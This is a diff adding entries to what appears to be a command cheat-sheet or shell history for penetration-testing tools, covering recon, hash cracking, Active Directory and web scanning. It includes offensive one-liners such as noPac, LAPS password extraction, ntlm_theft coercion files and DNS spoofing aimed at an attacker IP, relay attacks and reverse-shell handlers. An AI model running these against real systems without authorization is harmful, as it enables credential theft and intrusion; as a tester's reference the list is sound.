@@ -1,4 +1,5 @@
 hashcat --identify $HASH_FILE
+hashid $HASH
 zip2john archive.zip > $HASH_FILE
 gpp-decrypt $BASE64_GPP_PASS
 ffuf -u http://$IP -H "Host:FUZZ.$DOMAIN" -w $SUB_DOMAIN_WORDLIST
@@ -116,3 +117,44 @@ pre2k auth -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $IP
 pre2k unauth -d $DOMAIN -dc-ip $IP -inputfile $TARGETFILE
 mssqlpwner $USER:$PASSWORD@$IP interactive
 mssqlpwner $USER:$PASSWORD@$IP -windows-auth interactive
+foremost -i $INPUTFILE
+testdisk
+onesixtyone -c $COMUNITIES_WORDLIST $IP
+dnsenum --noreverse -o $OUTPUT_FILE $DOMAIN
+dnsmap $DOMAIN -w $WORDLIST
+cewl -d $DEPTH -w $OUTPUT_FILE $URL
+whatweb $TARGET
+nbtscan -e $IP_RANGE
+sslscan $TARGET
+jwt-hack decode $JWT
+jwt-hack scan $JWT
+gowitness scan file -f $TARGETS_FILE --write-db
+gowitness report server
+ldapnomnom --input $USERNAME_LIST --output $OUTPUT_FILE --server $TARGET --parallel $NB_CONN
+s3scanner -provider $PROVIDER -bucket $TARGET_BUCKET
+git-dumper $TARGET_URL $OUTPUT_DIR
+abuseACL $DOMAIN/$USER:"$PASSWORD"@$TARGET
+adidnsdump $TARGET
+semgrep scan --metrics=off -f /code-analysis/semgrep-rules .
+acltoolkit $DOMAIN/$USER:$PASSWORD@$IP get-objectacl
+wafw00f $TARGET
+penelope
+sslyze $TARGET
+apachetomcatscanner -tt $TARGET -tp $PORT --list-cves
+dicozorus init
+dicozorus gen -o $WORDLIST_OUTPUT
+mycli -u $USER -P $PORT -h $TARGET $DATABASE
+unblob $FILE
+cewler -d $DEPTH -o $OUTPUT_FILE $URL
+pwncat-vl
+dnschef --fakeip $ATTACKER_IP
+ghostspn scan -u $USERNAME -p $PASSWORD -d $DOMAIN --dc-ip $IP
+noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
+pyLAPS.py --action get -u $USER -d $DOMAIN -p $DOMAIN --dc-ip $DC_IP
+ntlm_theft -g all -f $FILENAME -s $ATTACKER_IP
+sccmhunter find -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP
+sccmhunter http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP
+relayking -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_IP -vv --audit --protocols smb,ldap,ldaps,mssql,http,https --threads 10 -o plaintext,json --output-file $OUTPUT_FILE --proto-portscan --ntlmv1 --gen-relay-list $REALYABLE_OUTPUT
+searchsploit $SEARCH_TERM1
+searchsploit $REL_PATH -p
+odat all -s $TARGET_IP -p $PORT -U $USER -P $PASSWORD
